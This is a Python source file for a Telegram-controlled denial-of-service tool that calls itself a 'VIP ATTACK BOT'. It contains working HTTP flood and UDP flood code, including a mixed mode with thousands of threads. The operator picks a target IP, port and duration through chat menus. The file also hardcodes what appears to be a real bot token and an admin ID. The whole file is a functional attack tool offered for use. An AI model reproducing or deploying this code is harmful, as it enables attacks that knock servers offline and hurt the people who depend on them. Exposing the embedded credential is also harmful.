import requests
import time
import threading
import random
import socket
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from datetime import datetime

TOKEN = "8278228198:AAG7C97c7R50_gsykoqBMwesCuoRZTciCLA"
ADMIN_ID = 8210011971

# Global variables
attack_active = False
user_state = {}

# =============== ATTACK WORKERS ===============
def send_http_worker(ip, port):
    url = f"http://{ip}:{port}/"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
    global attack_active
    while attack_active:
        try:
            requests.get(url, headers=headers, timeout=3)
            requests.post(url, data={"d": random.randint(1,9999)}, timeout=3)
        except:
            pass

def udp_worker(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = random._urandom(65500)
    global attack_active
    while attack_active:
        try:
            sock.sendto(packet, (ip, port))
        except:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

def start_http_attack(ip, port, threads, duration):
    global attack_active
    attack_active = True
    for _ in range(threads):
        t = threading.Thread(target=send_http_worker, args=(ip, port))
        t.daemon = True
        t.start()
    time.sleep(duration)
    attack_active = False

def start_udp_attack(ip, port, threads, duration):
    global attack_active
    attack_active = True
    for _ in range(threads):
        t = threading.Thread(target=udp_worker, args=(ip, port))
        t.daemon = True
        t.start()
    time.sleep(duration)
    attack_active = False

def start_mixed_attack(ip, port, threads, duration):
    global attack_active
    attack_active = True
    for _ in range(threads // 2):
        t = threading.Thread(target=send_http_worker, args=(ip, port))
        t.daemon = True
        t.start()
    for _ in range(threads // 2):
        t = threading.Thread(target=udp_worker, args=(ip, port))
        t.daemon = True
        t.start()
    time.sleep(duration)
    attack_active = False

# =============== BOT COMMANDS ===============
def start(update, context):
    if update.effective_user.id != ADMIN_ID:
        update.message.reply_text("❌ *UNAUTHORIZED ACCESS*\nYou are not allowed to use this bot.", parse_mode='Markdown')
        return
    
    keyboard = [
        [InlineKeyboardButton("🔥 NEW ATTACK", callback_data="new_attack")],
        [InlineKeyboardButton("📊 BOT STATUS", callback_data="status")],
        [InlineKeyboardButton("🛑 STOP ATTACK", callback_data="stop")],
        [InlineKeyboardButton("❓ HELP", callback_data="help")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    welcome_text = (
        "┌─────────────────────────┐\n"
        "│  🔥 *VIP ATTACK BOT* 🔥  │\n"
        "├─────────────────────────┤\n"
        "│  ⚡ Layer 7 DDoS Tool    │\n"
        "│  🌊 UDP Flood Support   │\n"
        "│  🔥 Mixed Mode Attack   │\n"
        "└─────────────────────────┘\n\n"
        "📌 *Select an option below:*"
    )
    
    update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode='Markdown')

def show_attack_type_menu(update, context):
    keyboard = [
        [InlineKeyboardButton("⚡ HTTP FLOOD", callback_data="attack_http")],
        [InlineKeyboardButton("🌊 UDP FLOOD", callback_data="attack_udp")],
        [InlineKeyboardButton("🔥 MIXED ATTACK", callback_data="attack_mixed")],
        [InlineKeyboardButton("🔙 BACK TO MENU", callback_data="main_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    text = (
        "┌─────────────────────────┐\n"
        "│  *SELECT ATTACK TYPE*   │\n"
        "├─────────────────────────┤\n"
        "│ ⚡ HTTP  → Web Servers   │\n"
        "│ 🌊 UDP   → Game Servers  │\n"
        "│ 🔥 Mixed → Maximum Power │\n"
        "└─────────────────────────┘"
    )
    
    if update.callback_query:
        update.callback_query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')
    else:
        update.message.reply_text(text, reply_markup=reply_markup, parse_mode='Markdown')

def show_example_menu(update, context):
    keyboard = [
        [InlineKeyboardButton("📝 ENTER TARGET NOW", callback_data="enter_target")],
        [InlineKeyboardButton("🔙 BACK", callback_data="attack_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    example_text = (
        "┌─────────────────────────┐\n"
        "│  *HOW TO SEND TARGET*   │\n"
        "├─────────────────────────┤\n"
        "│ Format:                 │\n"
        "│ `IP PORT TIME`          │\n"
        "├─────────────────────────┤\n"
        "│ Example:                │\n"
        "│ `192.168.1.100 80 120`  │\n"
        "├─────────────────────────┤\n"
        "│ 📡 IP: Target address   │\n"
        "│ 🔌 Port: 1-65535        │\n"
        "│ ⏱️ Time: 10-3600 sec    │\n"
        "└─────────────────────────┘"
    )
    
    if update.callback_query:
        update.callback_query.edit_message_text(example_text, reply_markup=reply_markup, parse_mode='Markdown')
    else:
        update.message.reply_text(example_text, reply_markup=reply_markup, parse_mode='Markdown')

def show_threads_menu(update, context, user_id):
    keyboard = [
        [InlineKeyboardButton("🔹 500 THREADS", callback_data="threads_500")],
        [InlineKeyboardButton("🔸 1000 THREADS", callback_data="threads_1000")],
        [InlineKeyboardButton("🔹 2000 THREADS", callback_data="threads_2000")],
        [InlineKeyboardButton("🔸 3000 THREADS", callback_data="threads_3000")],
        [InlineKeyboardButton("🔹 5000 THREADS", callback_data="threads_5000")],
        [InlineKeyboardButton("🔙 BACK", callback_data="enter_target")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    ip = user_state[user_id]["ip"]
    port = user_state[user_id]["port"]
    time_sec = user_state[user_id]["time"]
    attack_type = user_state[user_id]["attack_type"]
    
    attack_names = {"http": "HTTP", "udp": "UDP", "mixed": "MIXED"}
    
    text = (
        f"┌─────────────────────────┐\n"
        f"│  *CONFIRM TARGET*       │\n"
        f"├─────────────────────────┤\n"
        f"│ 📡 IP: `{ip}`           │\n"
        f"│ 🔌 Port: `{port}`       │\n"
        f"│ ⏱️ Time: `{time_sec}`s  │\n"
        f"│ ⚔️ Type: {attack_names[attack_type]} │\n"
        f"├─────────────────────────┤\n"
        f"│  *SELECT THREADS*       │\n"
        f"└─────────────────────────┘"
    )
    
    if update.callback_query:
        update.callback_query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')
    else:
        update.message.reply_text(text, reply_markup=reply_markup, parse_mode='Markdown')

def start_attack_with_countdown(update, context, user_id, ip, port, time_sec, threads, attack_type):
    global attack_active
    attack_names_full = {"http": "⚡ HTTP FLOOD", "udp": "🌊 UDP FLOOD", "mixed": "🔥 MIXED ATTACK"}
    
    msg = context.bot.send_message(
        chat_id=user_id,
        text=f"┌─────────────────────────┐\n"
             f"│  🔥 *ATTACK STARTED* 🔥  │\n"
             f"├─────────────────────────┤\n"
             f"│ 🎯 Target: `{ip}:{port}`\n"
             f"│ ⚔️ Type: {attack_names_full[attack_type]}\n"
             f"│ 🧵 Threads: `{threads}`\n"
             f"│ ⏱️ Duration: `{time_sec}` sec\n"
             f"└─────────────────────────┘",
        parse_mode='Markdown'
    )
    
    def run_attack():
        if attack_type == "http":
            start_http_attack(ip, port, threads, time_sec)
        elif attack_type == "udp":
            start_udp_attack(ip, port, threads, time_sec)
        else:
            start_mixed_attack(ip, port, threads, time_sec)
    
    attack_thread = threading.Thread(target=run_attack)
    attack_thread.start()
    
    for remaining in range(time_sec, 0, -1):
        if not attack_active:
            context.bot.send_message(chat_id=user_id, text="🛑 *ATTACK STOPPED*", parse_mode='Markdown')
            return
        if remaining % 10 == 0 or remaining <= 5:
            progress = int((time_sec - remaining) / time_sec * 20)
            bar = "█" * progress + "░" * (20 - progress)
            try:
                context.bot.edit_message_text(
                    chat_id=user_id,
                    message_id=msg.message_id,
                    text=f"┌─────────────────────────┐\n"
                         f"│  🔥 *ATTACK IN PROGRESS* 🔥\n"
                         f"├─────────────────────────┤\n"
                         f"│ 🎯 Target: `{ip}:{port}`\n"
                         f"│ ⚔️ Type: {attack_names_full[attack_type]}\n"
                         f"│ 🧵 Threads: `{threads}`\n"
                         f"│ 📊 Progress: `{bar}`\n"
                         f"│ ⏱️ Remaining: `{remaining}` sec\n"
                         f"└─────────────────────────┘",
                    parse_mode='Markdown'
                )
            except:
                pass
        time.sleep(1)
    
    attack_thread.join()
    context.bot.send_message(chat_id=user_id, text="✅ *ATTACK COMPLETED!*\n\nSend /start for new attack.", parse_mode='Markdown')
    if user_id in user_state:
        del user_state[user_id]

def handle_message(update, context):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        return
    
    if user_id not in user_state:
        update.message.reply_text("❌ Please use /start to begin.")
        return
    
    state = user_state[user_id]
    message = update.message.text.strip()
    
    if state.get("step") == "awaiting_target":
        parts = message.split()
        if len(parts) == 3:
            ip, port, time_sec = parts
            try:
                port = int(port)
                time_sec = int(time_sec)
                if 1 <= port <= 65535 and 10 <= time_sec <= 3600:
                    user_state[user_id]["ip"] = ip
                    user_state[user_id]["port"] = port
                    user_state[user_id]["time"] = time_sec
                    show_threads_menu(update, context, user_id)
                else:
                    update.message.reply_text("❌ Port (1-65535) or Time (10-3600) invalid.\n\nSend again: `IP PORT TIME`", parse_mode='Markdown')
            except ValueError:
                update.message.reply_text("❌ Port and Time must be numbers.\n\nSend again: `IP PORT TIME`", parse_mode='Markdown')
        else:
            update.message.reply_text("❌ Invalid format!\n\nSend: `IP PORT TIME`\nExample: `192.168.1.100 80 120`", parse_mode='Markdown')

def button_handler(update, context):
    query = update.callback_query
    query.answer()
    user_id = update.effective_user.id
    
    if user_id != ADMIN_ID:
        query.edit_message_text("❌ Unauthorized")
        return
    
    data = query.data
    
    if data == "main_menu":
        keyboard = [
            [InlineKeyboardButton("🔥 NEW ATTACK", callback_data="new_attack")],
            [InlineKeyboardButton("📊 BOT STATUS", callback_data="status")],
            [InlineKeyboardButton("🛑 STOP ATTACK", callback_data="stop")],
            [InlineKeyboardButton("❓ HELP", callback_data="help")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        query.edit_message_text(
            "┌─────────────────────────┐\n"
            "│  🔥 *VIP ATTACK BOT* 🔥  │\n"
            "├─────────────────────────┤\n"
            "│  ⚡ Layer 7 DDoS Tool    │\n"
            "│  🌊 UDP Flood Support   │\n"
            "│  🔥 Mixed Mode Attack   │\n"
            "└─────────────────────────┘\n\n"
            "📌 *Select an option:*",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif data == "new_attack":
        show_attack_type_menu(update, context)
    
    elif data == "attack_menu":
        show_attack_type_menu(update, context)
    
    elif data.startswith("attack_"):
        attack_type = data.replace("attack_", "")
        user_state[user_id] = {"attack_type": attack_type, "step": "awaiting_target"}
        show_example_menu(update, context)
    
    elif data == "enter_target":
        query.edit_message_text(
            "📝 *Send target in this format:*\n\n"
            "`IP PORT TIME`\n\n"
            "Example: `192.168.1.100 80 120`\n\n"
            "⏱️ Time: 10-3600 seconds",
            parse_mode='Markdown'
        )
    
    elif data.startswith("threads_"):
        threads = int(data.split("_")[1])
        ip = user_state[user_id]["ip"]
        port = user_state[user_id]["port"]
        time_sec = user_state[user_id]["time"]
        attack_type = user_state[user_id]["attack_type"]
        
        query.edit_message_text("⏳ *Starting attack...*", parse_mode='Markdown')
        
        threading.Thread(
            target=start_attack_with_countdown,
            args=(update, context, user_id, ip, port, time_sec, threads, attack_type)
        ).start()
        
        if user_id in user_state:
            del user_state[user_id]
    
    elif data == "status":
        global attack_active
        status_text = (
            "┌─────────────────────────┐\n"
            "│  📊 *BOT STATUS*        │\n"
            "├─────────────────────────┤\n"
            f"│ 🔴 Attack Active: `{attack_active}`\n"
            f"│ 👤 Active Sessions: `{len(user_state)}`\n"
            f"│ 🤖 Bot: `Online`\n"
            f"│ ⏰ Time: `{datetime.now().strftime('%H:%M:%S')}`\n"
            "└─────────────────────────┘"
        )
        query.edit_message_text(status_text, parse_mode='Markdown')
        time.sleep(3)
        show_main_menu(update, context)
    
    elif data == "stop":
        global attack_active
        attack_active = False
        query.edit_message_text("🛑 *EMERGENCY STOP*\nAll attacks halted.", parse_mode='Markdown')
        time.sleep(2)
        show_main_menu(update, context)
    
    elif data == "help":
        help_text = (
            "┌─────────────────────────┐\n"
            "│  ❓ *HELP GUIDE*        │\n"
            "├─────────────────────────┤\n"
            "│ /start - Main Menu      │\n"
            "│ /stop  - Stop Attack    │\n"
            "├─────────────────────────┤\n"
            "│ 1. Select Attack Type   │\n"
            "│ 2. Send: IP PORT TIME   │\n"
            "│ 3. Select Threads       │\n"
            "│ 4. Attack Starts!       │\n"
            "└─────────────────────────┘"
        )
        query.edit_message_text(help_text, parse_mode='Markdown')
        time.sleep(3)
        show_main_menu(update, context)

def show_main_menu(update, context):
    keyboard = [
        [InlineKeyboardButton("🔥 NEW ATTACK", callback_data="new_attack")],
        [InlineKeyboardButton("📊 BOT STATUS", callback_data="status")],
        [InlineKeyboardButton("🛑 STOP ATTACK", callback_data="stop")],
        [InlineKeyboardButton("❓ HELP", callback_data="help")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    welcome_text = (
        "┌─────────────────────────┐\n"
        "│  🔥 *VIP ATTACK BOT* 🔥  │\n"
        "├─────────────────────────┤\n"
        "│  ⚡ Layer 7 DDoS Tool    │\n"
        "│  🌊 UDP Flood Support   │\n"
        "│  🔥 Mixed Mode Attack   │\n"
        "└─────────────────────────┘\n\n"
        "📌 *Select an option below:*"
    )
    
    if update.callback_query:
        update.callback_query.edit_message_text(welcome_text, reply_markup=reply_markup, parse_mode='Markdown')
    else:
        update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode='Markdown')

def stop(update, context):
    global attack_active
    if update.effective_user.id != ADMIN_ID:
        return
    attack_active = False
    update.message.reply_text("🛑 *EMERGENCY STOP*\nAll attacks halted.", parse_mode='Markdown')

def main():
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("stop", stop))
    dp.add_handler(CallbackQueryHandler(button_handler))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))
    
    print("="*50)
    print("🔥 PROFESSIONAL VIP ATTACK BOT is RUNNING 🔥")
    print("="*50)
    print(f"🤖 Bot Token: {TOKEN[:15]}...")
    print(f"👑 Admin ID: {ADMIN_ID}")
    print(f"📡 Status: ONLINE")
    print("="*50)
    
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
EOF
